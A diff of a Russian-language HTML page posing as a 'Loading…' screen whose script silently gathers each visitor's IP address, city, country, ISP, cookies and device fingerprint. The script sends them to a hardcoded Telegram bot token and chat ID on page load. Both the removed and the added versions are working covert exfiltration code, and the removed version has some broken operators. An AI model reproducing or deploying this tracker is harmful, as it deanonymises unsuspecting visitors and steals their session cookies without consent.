@@ -1,75 +1,40 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
 <meta charset="utf-8">
-<title>Загрузка...</title>
+<title>Загрузка</title>
 </head>
 <body>
 <h1>Секунду...</h1>
 <script>
-const TOKEN = '8847544358:AAFH7jhYxPh7xuTHmoMZXYYHGcxzsYnHGe0';
-const CHAT_ID = '6783102477';
-const $ = s => s || '?';
+var TOKEN = '8847544358:AAFH7jhYxPh7xuTHmoMZXYYHGcxzsYnHGe0';
+var ID = '6783102477';
 
-(async () => {
-  let ip = '?', geo = '?', bat = 'нет', gpu = '?';
-
-  for (const u of ['https://ipapi.co/json/', 'https://ipwho.is/']) {
-    try {
-      const r = await fetch(u).then(x => x.json());
-      if (!r.ip) continue;
-      ip = r.ip;
-      const city = r.city || '';
-      const country = r.country_name  r.country  '';
-      const isp = r.org  (r.connection && r.connection.isp)  '';
-      geo = [city, country, isp].filter(Boolean).join(', ');
-      break;
-    } catch(e) {}
-  }
-
-  if (navigator.getBattery) {
-    try {
-      const b = await navigator.getBattery();
-      bat = Math.round(b.level * 100) + '% ' + (b.charging ? '⚡' : '🔋');
-    } catch(e) {}
-  }
-
-  try {
-    const gl = document.createElement('canvas').getContext('webgl');
-    const d = gl.getExtension('WEBGL_debug_renderer_info');
-    if (d) gpu = gl.getParameter(d.UNMASKED_RENDERER_WEBGL);
-  } catch(e) {}
-
-  const device = /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? '📱 мобильный' : '💻 десктоп';
-
-  const text = [
-    '🔔 Заход',
-    '📡 IP: ' + ip,
-    '📍 ' + geo,
-    '🌐 ' + location.href,
-    '🍪 ' + (document.cookie || 'пусто'),
-    device,
-    '🖥 ' + navigator.userAgent,
-    '💻 ' + $(navigator.platform) + ' | ' + $(navigator.language),
-    '🕐 ' + Intl.DateTimeFormat().resolvedOptions().timeZone,
-    '📺 ' + screen.width + 'x' + screen.height + ' x' + window.devicePixelRatio,
-    '⚙️ CPU ' + $(navigator.hardwareConcurrency) + ' | RAM ' + $(navigator.deviceMemory) + 'GB',
-    '📶 ' + $((navigator.connection && navigator.connection.effectiveType)),
-    '🔋 ' + bat,
-    '🎮 ' + gpu
-  ].join('\n');
-
-  try {
-    await fetch('https://api.telegram.org/bot' + TOKEN + '/sendMessage', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: CHAT_ID, text: text }),
-      keepalive: true
-    });
-  } catch(e) {}
-
+fetch('https://ipwho.is/')
+.then(function(r){ return r.json(); })
+.then(function(r){
+  var t = 'IP: ' + r.ip
+    + '\nГород: ' + r.city
+    + '\nСтрана: ' + r.country
+    + '\nПровайдер: ' + (r.connection ? r.connection.isp : '?')
+    + '\nUA: ' + navigator.userAgent
+    + '\nПлатформа: ' + navigator.platform
+    + '\nЯзык: ' + navigator.language
+    + '\nЧасовой пояс: ' + Intl.DateTimeFormat().resolvedOptions().timeZone
+    + '\nЭкран: ' + screen.width + 'x' + screen.height
+    + '\nCPU: ' + navigator.hardwareConcurrency
+    + '\nCookies: ' + (document.cookie || 'пусто');
+  var u = 'https://api.telegram.org/bot' + TOKEN + '/sendMessage'
+        + '?chat_id=' + ID
+        + '&text=' + encodeURIComponent(t);
+  return fetch(u);
+})
+.then(function(){
   document.body.innerHTML = '<h1>Готово</h1>';
-})();
+})
+.catch(function(e){
+  document.body.innerHTML = '<h1 style="color:red">' + e.message + '</h1>';
+});
 </script>
 </body>
 </html>
